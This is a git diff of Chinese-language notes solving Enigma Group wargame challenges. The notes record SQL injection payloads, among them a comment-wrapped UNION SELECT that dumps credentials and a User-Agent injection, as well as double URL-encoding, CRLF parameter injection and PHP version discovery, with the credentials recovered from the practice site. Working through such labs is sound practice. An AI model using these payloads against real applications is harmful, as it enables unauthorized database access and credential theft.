@@ -44,7 +44,7 @@ CHALLENGES :http://www.enigmagroup.org/
         sql3: 绕过filter：
             /*!union*/ select 10,username,password from users-- ：输出administrator  6cfdca6f9633968c72a2a6e0fe2756ca（这个加了两次密）
             解密后密码：asdfgh
-<<<<<<< HEAD
+            
 
         sql4: User agent SQL injection
             修改 User Agent字段：
@@ -54,10 +54,25 @@ CHALLENGES :http://www.enigmagroup.org/
 
             继续修改：User-Agent: (select * from /*!information_sechma*/)
             返回错误：Looking at the information_schema table is forbidden; however, if we did allow you, you could have found the tablename SQL4users.
-            
 
-         
-            
-       
-=======
->>>>>>> 3ab0d806098ae715b07b95ab0543dc6eb467f74a
+
+
+URL Manipulation:
+         URL1: 随便填写一个，然后触发错误：
+                       Error finding aaa in password.php
+               修改url为：http://www.enigmagroup.org/missions/basics/um/1/index.php?file=password.php
+                       出现： administrator:c440b4
+
+         URL2: 对于url: http://www.enigmagroup.org/missions/basics/um/2/%27 
+               直接使用会把%27解析为'，因此需要对%27进行URL编码，得到%2527
+               最终URL：http://www.enigmagroup.org/missions/basics/um/2/%2527
+
+         URL3: 根据题目可知服务端接收一个参数：url。因此请求的URL应该为：
+               http://www.enigmagroup.org/missions/basics/um/3/splitme.php?url=split%0D%0Ame.php
+
+
+Reconnaissance
+        Reconnaissance 2 - PHP Version :
+        利用PHP Easter Egg可以发现PHP版本，使用下面的URL:
+        http://www.enigmagroup.org/missions/basics/recon/2/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42
+        
